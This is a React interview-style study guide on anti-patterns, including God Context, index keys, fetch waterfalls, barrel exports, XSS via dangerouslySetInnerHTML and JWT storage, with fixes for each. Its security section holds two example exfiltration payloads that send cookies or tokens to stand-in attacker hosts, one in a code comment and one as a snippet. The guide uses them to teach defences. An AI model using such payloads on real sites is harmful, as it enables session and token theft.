# 09 — Anti-Patterns & Gotchas Encyclopedia

> The definitive encyclopedia of catastrophic architectural mistakes, subtle performance traps, state mismanagement bugs, and security vulnerabilities that plague enterprise React applications — with before/after code refactorings.

---

## 📑 Table of Contents
1. [State Architecture Anti-Patterns](#1-state-architecture-anti-patterns)
2. [Rendering & Reconciliation Traps](#2-rendering--reconciliation-traps)
3. [Data Fetching & Async Anti-Patterns](#3-data-fetching--async-anti-patterns)
4. [Component & Folder Architecture Anti-Patterns](#4-component--folder-architecture-anti-patterns)
5. [Bundle & Performance Disasters](#5-bundle--performance-disasters)
6. [Security & Web Vulnerabilities](#6-security--web-vulnerabilities)
7. [🎯 Quick-Fire Trap Questions](#7--quick-fire-trap-questions)

---

## 1. State Architecture Anti-Patterns

### Q1: The "God Context" Anti-Pattern: Why putting authentication, theme, notifications, and form state into a single Context destroys application performance, and how to refactor it.

**Difficulty:** 🔴 Senior  
**Type:** 🐛 Debug & Bug Hunting  
**Tags:** `Context` `Performance` `State-Architecture`

**Answer:**

#### ❌ The Anti-Pattern:
Putting disparate slices of state with different update frequencies into a single Context object. Whenever ANY property changes, **EVERY single component calling `useContext(AppContext)` is forced to re-render**, regardless of whether it consumed that property.

```tsx
// ❌ ANTI-PATTERN: God Context
interface AppState {
  user: User | null;          // Updates: Rare (Login/Logout)
  theme: 'light' | 'dark';    // Updates: Infrequent
  notifications: string[];   // Updates: Frequent
  mousePosition: { x: number; y: number }; // Updates: 60fps!
}

const AppContext = createContext<AppState | null>(null);

export const Header: React.FC = () => {
  // Even though Header only cares about theme, it re-renders at 60fps when mousePosition changes!
  const { theme } = useContext(AppContext)!;
  return <nav className={`nav-${theme}`}>Dashboard</nav>;
};
```

#### ✅ Architect's Solution: Context Splitting by Update Frequency
Split contexts based on **domain boundary** and **update velocity**:

```tsx
// ✅ ARCHITECT SOLUTION: Dedicated Scoped Providers

// 1. Static/Low-frequency Context
const UserContext = createContext<User | null>(null);

// 2. Medium-frequency Context
const ThemeContext = createContext<'light' | 'dark'>('light');

// 3. High-frequency state must NEVER be in Context: use dedicated external stores (Zustand/useSyncExternalStore)
import { create } from 'zustand';

export const useMouseStore = create<{ x: number; y: number }>((set) => ({
  x: 0,
  y: 0,
}));

// Component only re-renders when its exact slice changes
export const Header: React.FC = () => {
  const theme = useContext(ThemeContext);
  return <nav className={`nav-${theme}`}>Dashboard</nav>;
};
```

**Rule of Thumb:**
- Low update frequency (Auth, Theme, Org) → **React Context**
- Medium-to-High update frequency (Forms, Cart, Real-time indicators) → **Zustand / Jotai**
- High velocity (60fps animation, mouse, audio) → **Refs / direct DOM mutation / canvas**

---

### Q2: The "Derived State in `useState` + `useEffect`" Anti-Pattern: Why mirroring props or calculating filtered data with effects creates infinite loops and stale renders.

**Difficulty:** 🟡 Mid  
**Type:** 🐛 Debug & Bug Hunting  
**Tags:** `Derived-State` `useEffect` `Anti-Pattern`

**Answer:**

#### ❌ The Anti-Pattern:
Storing computed or filtered values in state and updating them via `useEffect`:

```tsx
// ❌ ANTI-PATTERN: Redundant state + asynchronous effect sync
function UserDirectory({ users, searchQuery }: { users: User[]; searchQuery: string }) {
  const [filteredUsers, setFilteredUsers] = useState<User[]>([]);

  useEffect(() => {
    // Causes a SECOND render pass every time users or searchQuery changes!
    // Creates a brief flicker where the old filtered list is displayed with new search query.
    setFilteredUsers(
      users.filter((u) => u.name.toLowerCase().includes(searchQuery.toLowerCase()))
    );
  }, [users, searchQuery]);

  return <ul>{filteredUsers.map(u => <li key={u.id}>{u.name}</li>)}</ul>;
}
```

#### ✅ Architect's Solution: Calculate During Render / `useMemo`
If a value can be derived from existing props or state, **do not put it in state**:

```tsx
// ✅ ARCHITECT SOLUTION: Pure calculation during render
function UserDirectory({ users, searchQuery }: { users: User[]; searchQuery: string }) {
  // Computed synchronously in the same render pass — zero flicker, zero extra re-render
  const filteredUsers = useMemo(() => {
    const query = searchQuery.toLowerCase();
    return users.filter((u) => u.name.toLowerCase().includes(query));
  }, [users, searchQuery]);

  return <ul>{filteredUsers.map(u => <li key={u.id}>{u.name}</li>)}</ul>;
}
```

---

## 2. Rendering & Reconciliation Traps

### Q3: Why does `React.memo` fail silently when components receive inline objects, arrays, or anonymous callbacks?

**Difficulty:** 🟡 Mid  
**Type:** 🧩 Output Prediction / Debug  
**Tags:** `React.memo` `Object-Identity` `Reconciliation`

**Answer:**

`React.memo` performs a **shallow equality comparison (`Object.is`)** on props:

```tsx
// ❌ ANTI-PATTERN: Breaking memo with reference instability
const ExpensiveChart = React.memo(({ data, options, onClick }: ChartProps) => {
  // Expensive rendering logic...
  return <div onClick={onClick}>Chart</div>;
});

function Dashboard() {
  const [count, setCount] = useState(0);

  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>Increment {count}</button>
      
      {/* 
        BUG: Every time 'count' changes, Dashboard re-renders.
        `options={{ responsive: true }}` creates a brand new Object reference in memory!
        `onClick={() => console.log('click')}` creates a brand new Function reference!
        `React.memo` sees `prevProps.options !== nextProps.options` and RE-RENDERS ExpensiveChart!
      */}
      <ExpensiveChart 
        data={chartData} 
        options={{ responsive: true }} 
        onClick={() => console.log('click')} 
      />
    </div>
  );
}
```

#### ✅ Architect's Fix:
1. Lift static objects outside the component scope entirely (zero memory allocation per render).
2. Stabilize dynamic callbacks with `useCallback` and objects with `useMemo`.

```tsx
// ✅ Constant hoisted outside component: stable reference forever
const CHART_OPTIONS = { responsive: true };

function Dashboard() {
  const [count, setCount] = useState(0);

  const handleClick = useCallback(() => {
    console.log('click');
  }, []);

  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>Increment {count}</button>
      <ExpensiveChart 
        data={chartData} 
        options={CHART_OPTIONS} 
        onClick={handleClick} 
      />
    </div>
  );
}
```

---

### Q4: The "Array Index as Key" Trap: Walk through the exact DOM mutation disaster that occurs when using index as key in dynamic lists.

**Difficulty:** 🟡 Mid  
**Type:** 🐛 Debug & Bug Hunting  
**Tags:** `Reconciliation` `Keys` `DOM`

**Answer:**

When items in an array are reordered, inserted at the beginning, or deleted, using array index as key breaks React's reconciliation identity algorithm:

```tsx
// ❌ ANTI-PATTERN: Index as key on mutable list
function TodoList() {
  const [todos, setTodos] = useState(['Buy milk', 'Pay bills', 'Gym']);

  const deleteFirst = () => {
    setTodos((prev) => prev.slice(1));
  };

  return (
    <div>
      <button onClick={deleteFirst}>Delete First</button>
      <ul>
        {todos.map((todo, index) => (
          // When item 0 is deleted, 'Pay bills' becomes index 0!
          // React thinks the element with key 0 did not move, but its text changed!
          <TodoItem key={index} title={todo} />
        ))}
      </ul>
    </div>
  );
}

function TodoItem({ title }: { title: string }) {
  // If TodoItem has local internal state (e.g. an uncontrolled <input type="checkbox">):
  // The checkbox state STAYS with index 0 instead of following 'Buy milk'!
  const [checked, setChecked] = useState(false);
  return (
    <li>
      <input type="checkbox" checked={checked} onChange={e => setChecked(e.target.checked)} />
      {title}
    </li>
  );
}
```

#### Visualizing the Bug:
1. User checks item 0 ("Buy milk").
2. User clicks "Delete First".
3. Array becomes `['Pay bills', 'Gym']`.
4. React inspects `key="0"`. It reuses the old DOM node for key 0—which already has `checked = true`.
5. Result: "Pay bills" appears checked, and "Buy milk" was deleted!

#### ✅ Architect's Solution:
Always use stable, unique, and predictable IDs from your data model (`todo.id`, `crypto.randomUUID()`).

---

## 3. Data Fetching & Async Anti-Patterns

### Q5: The "Fetch-on-Render Waterfall" Disaster: How nested components with `useEffect` data fetching ruin Web Vitals, and how to eliminate it.

**Difficulty:** 🔴 Senior  
**Type:** 🏗️ Architecture  
**Tags:** `Waterfalls` `Network` `Performance` `RSC`

**Answer:**

```
User visits page
  │
  ├─> 1. Download App JS bundle (200ms)
  │
  ├─> 2. Mount <DashboardLayout> ──> useEffect() triggers GET /api/user (300ms)
  │                                     │
  │     Wait for response...            ▼
  ├─> 3. User loaded, now render <TeamSection> ──> useEffect() triggers GET /api/team (400ms)
  │                                                    │
  │     Wait for response...                           ▼
  └─> 4. Team loaded, now render <ProjectList> ──> useEffect() triggers GET /api/projects (500ms)

Total Time to Interactive: 200 + 300 + 400 + 500 = 1400ms (Serial Waterfall)
```

#### ✅ Architect's Solutions:

1. **Parallel Fetching at Route Boundary (React Router 6.4+ / TanStack Router Loaders):**
   Fetch all data in parallel before components even mount:
   ```typescript
   export const dashboardLoader = async () => {
     const [user, team, projects] = await Promise.all([
       fetchUser(),
       fetchTeam(),
       fetchProjects(),
     ]);
     return { user, team, projects };
   };
   ```

2. **React Server Components (RSC) with Suspense Streaming:**
   Render components on the server and stream HTML chunks as promises resolve.

---

### Q6: Search Input Race Condition: Explain why fast typing causes stale responses to overwrite fresh results, and demonstrate the fix.

**Difficulty:** 🟡 Mid  
**Type:** 🐛 Debug & Bug Hunting  
**Tags:** `Race-Conditions` `AbortController` `Async`

**Answer:**

```
User types "A"     ──> Request 1 sent (slow network, takes 800ms)
User types "AB"    ──> Request 2 sent (fast network / cached, takes 150ms)
                     │
                     ├─> Request 2 resolves at t = 150ms. UI displays results for "AB"
                     │
                     └─> Request 1 FINALLY resolves at t = 800ms. UI overrides with results for "A"!
```

#### ✅ Architect's Fix via `AbortController`:

```tsx
// ✅ Correct cancellation pattern
function SearchInput() {
  const [query, setQuery] = useState('');
  const [results, setResults] = useState<string[]>([]);

  useEffect(() => {
    if (!query) return;

    // Create abort controller for current effect pass
    const controller = new AbortController();

    async function search() {
      try {
        const res = await fetch(`/api/search?q=${encodeURIComponent(query)}`, {
          signal: controller.signal,
        });
        const data = await res.json();
        setResults(data);
      } catch (err: any) {
        if (err.name === 'AbortError') {
          // Ignored: expected cancellation
          return;
        }
        console.error('Search request failed', err);
      }
    }

    search();

    // Abort previous in-flight request when user types next character
    return () => {
      controller.abort();
    };
  }, [query]);

  return <input value={query} onChange={(e) => setQuery(e.target.value)} />;
}
```

---

## 4. Component & Folder Architecture Anti-Patterns

### Q7: The "Type-Based" Folder Structure vs "Feature-Based / Screaming" Architecture: Why grouping by file type collapses at 50+ components.

**Difficulty:** 🔴 Senior  
**Type:** 🏗️ Architecture  
**Tags:** `Project-Structure` `Maintainability` `Scalability`

**Answer:**

#### ❌ The Anti-Pattern: Type-Based Grouping (MVC Artifact)

```text
src/
├── components/       ← 180 files in a single flat directory
│   ├── Button.tsx
│   ├── InvoiceTable.tsx
│   ├── UserAvatar.tsx
│   └── CartModal.tsx
├── hooks/            ← 60 custom hooks
├── services/         ← 45 API calls
├── types/            ← 50 type definition files
└── utils/            ← 40 helper functions
```
**Why it fails:**
- To modify a single feature (e.g. `Invoices`), an engineer must open files across 5 distinct top-level folders.
- Deleting or deprecating a feature requires a forensic archaeological search across `hooks/`, `types/`, and `services/`.
- No clear ownership boundaries for engineering squads.

#### ✅ Architect's Solution: Feature-Driven / Domain-Driven Architecture

```text
src/
├── features/
│   ├── billing/              ← Everything about billing in one self-contained domain
│   │   ├── api/              ← billingApi.ts
│   │   ├── components/       ← InvoiceTable.tsx, PaymentMethodCard.tsx
│   │   ├── hooks/            ← useInvoices.ts
│   │   ├── types/            ← invoice.types.ts
│   │   └── index.ts          ← Public API barrel export
│   ├── catalog/
│   └── auth/
├── shared/                   ← Reusable primitives across ALL features
│   ├── components/           ← Button, Modal, Tooltip (Design System)
│   ├── hooks/                ← useDebounce, useMediaQuery
│   └── utils/
```

---

### Q8: The "Prop Drilling" Nightmare: When does prop drilling become an architectural defect, and what are the 3 graduated tiers of resolution?

**Difficulty:** 🟡 Mid  
**Type:** 📖 Conceptual  
**Tags:** `Prop-Drilling` `Composition` `Refactoring`

**Answer:**

Passing props through 1 or 2 levels is healthy, explicit, and easy to trace. When props are drilled through **4+ intermediate container components** that don't need or understand the data, it becomes an architectural defect.

#### The 3 Graduated Tiers of Resolution:

```
Tier 1: Component Composition (Slots / Children)
------------------------------------------------
Instead of passing `user` down 5 levels so `<Avatar>` can render:
Pass the rendered `<Avatar user={user} />` directly as `children` or a slot prop!
Eliminates the need for intermediate containers to touch the prop.

Tier 2: Scoped React Context
------------------------------------------------
Wrap the immediate subtree with a scoped context (e.g. `<AccordionProvider>`).
Only components inside the subtree that call `useAccordion()` re-render.

Tier 3: Atomic External State Store (Zustand / Jotai)
------------------------------------------------
When state needs to be accessed or mutated across completely disconnected branches
of the component tree without provider hierarchy nesting.
```

---

## 5. Bundle & Performance Disasters

### Q9: The "Monolithic Barrel Export" Disaster: How importing from `index.ts` can accidentally include an entire 2MB library in your initial chunk.

**Difficulty:** 🔴 Senior  
**Type:** 🐛 Debug & Bug Hunting  
**Tags:** `Tree-Shaking` `Barrel-Files` `Webpack` `Vite`

**Answer:**

#### ❌ The Anti-Pattern:
```typescript
// packages/ui/src/index.ts
export * from './Button';
export * from './Modal';
export * from './HeavyDataGrid';  // Imports AgGrid / Monocle (1.4MB!)
export * from './RichTextEditor'; // Imports Quill / Draft.js (800KB!)
```

Now, in your lightweight landing page:
```typescript
// src/LandingPage.tsx
import { Button } from '@packages/ui';
```

**What Happens:**
If your bundler (or library `package.json`) does not have `"sideEffects": false` properly configured, or if `RichTextEditor` executes top-level module code (e.g. `window.customElements.define(...)`), **the bundler will bundle the entire 2.2MB HeavyDataGrid and RichTextEditor into the Landing Page chunk**, destroying your LCP metric!

#### ✅ Architect's Prevention:
1. Specify `"sideEffects": false` in library `package.json`.
2. Avoid mega-barrel files for heavy components. Use subpath exports:
   ```json
   // package.json
   "exports": {
     "./button": "./dist/components/Button.js",
     "./grid": "./dist/components/HeavyDataGrid.js"
   }
   ```
3. Use `eslint-plugin-import` with `no-restricted-imports` to forbid importing from root barrels in performance-sensitive routes.

---

### Q10: Unvirtualized 10,000-Row DOM Trees: What happens to browser memory and frame rates, and how to detect it during code reviews?

**Difficulty:** 🟡 Mid  
**Type:** 📖 Conceptual  
**Tags:** `Virtualization` `DOM` `Memory` `Frame-Rate`

**Answer:**

Rendering 10,000 table rows without virtualization creates ~100,000 DOM nodes.
- **Memory Consumption:** Browser heap increases by 150MB–300MB.
- **Recalculate Style & Reflow:** Every minor state change causes the layout engine to calculate geometry for 100,000 nodes, dropping frame rate from 60fps to 4fps.
- **Garbage Collection Pauses:** Frequent GC pauses cause stuttering and unresponsive input fields.

**Code Review Detection Heuristics:**
Flag any `Array.prototype.map()` in code review if:
1. The list can grow unboundedly based on user data (transactions, logs, search results).
2. The endpoint lacks hard backend pagination limits.
3. The component does not use `@tanstack/react-virtual` or `react-window`.

---

## 6. Security & Web Vulnerabilities

### Q11: The `dangerouslySetInnerHTML` XSS Trap: How malicious markdown / rich-text rendering steals session tokens, and how to sanitize properly.

**Difficulty:** 🔴 Senior  
**Type:** 🐛 Debug & Bug Hunting  
**Tags:** `Security` `XSS` `DOMPurify` `Sanitization`

**Answer:**

#### ❌ The Vulnerability:
```tsx
// ❌ VULNERABLE: Direct HTML rendering of user-generated content
function CommentView({ userComment }: { userComment: string }) {
  // If userComment is: `<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">`
  // An XSS payload executes immediately on every user who views this page!
  return <div dangerouslySetInnerHTML={{ __html: userComment }} />;
}
```

#### ✅ Architect's Solution: Rigorous Sanitization via DOMPurify
Never pass un-sanitized strings to `dangerouslySetInnerHTML`:

```tsx
import DOMPurify from 'dompurify';

export function SafeHtmlRenderer({ htmlContent }: { htmlContent: string }) {
  // Sanitize strictly on client before inserting into DOM
  const cleanHtml = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  });

  return (
    <div 
      dangerouslySetInnerHTML={{ __html: cleanHtml }} 
      // Always enforce noopener noreferrer on user-generated links
    />
  );
}
```

---

### Q12: Why storing JWT access tokens in `localStorage` is an architectural security violation, and what is the secure alternative?

**Difficulty:** 🔴 Senior  
**Type:** 📖 Conceptual  
**Tags:** `Security` `JWT` `Cookies` `HttpOnly`

**Answer:**

#### The Vulnerability of `localStorage`:
Any JavaScript executing on the page—including third-party scripts (Google Tag Manager, analytics, chat widgets) or a minor XSS bug—can execute:
```javascript
const stolenToken = localStorage.getItem('access_token');
fetch('https://evil-server.com/collect', { body: stolenToken });
```

#### The Secure Enterprise Pattern:
1. **`HttpOnly`, `Secure`, `SameSite=Lax/Strict` Cookies:**
   - The browser automatically sends the cookie with matching API requests.
   - JavaScript **cannot read or steal the cookie** (`document.cookie` returns empty string).
2. **In-Memory Token + HttpOnly Refresh Cookie:**
   - Access token (short-lived, 5-15 mins) is kept purely in React JavaScript memory (`useAuthStore`).
   - Refresh token is stored in an `HttpOnly` cookie.
   - When the user refreshes the page, the client calls `/auth/refresh` to get a fresh access token in memory.

---

## 7. 🎯 Quick-Fire Trap Questions

### Q13: "What happens if you call `setState` inside the render body (outside of effects or callbacks)?"

**Difficulty:** 🟢 Junior  
**Type:** 🧩 Output Prediction  
**Tags:** `React-Lifecycle` `State`

**Answer:**
If called unconditionally:
```tsx
function Component() {
  const [count, setCount] = useState(0);
  setCount(count + 1); // ❌ Unconditional state update during render!
  return <div>{count}</div>;
}
```
React will immediately crash with:
`Too many re-renders. React limits the number of renders to prevent an infinite loop.`
*(React allows conditional state updates during render strictly for adjusting state based on changed props, but even that is usually an anti-pattern replaced by pure derived calculation).*

---

### Q14: "Why should you never mutate state objects directly before passing them to `setState`?"

**Difficulty:** 🟢 Junior  
**Type:** 🐛 Debug & Bug Hunting  
**Tags:** `Immutability` `Reconciliation`

**Answer:**
```tsx
const [user, setUser] = useState({ name: 'Alice', age: 30 });

const handleBirthday = () => {
  user.age = 31; // ❌ Direct mutation!
  setUser(user); // Passes identical object reference!
};
```
React uses `Object.is(prev, next)` comparison. Because the memory reference `user` did not change, **React assumes nothing changed and skips the re-render completely!** The UI remains displaying "30".
*Fix:* Always return a new object reference: `setUser(prev => ({ ...prev, age: prev.age + 1 }))`.
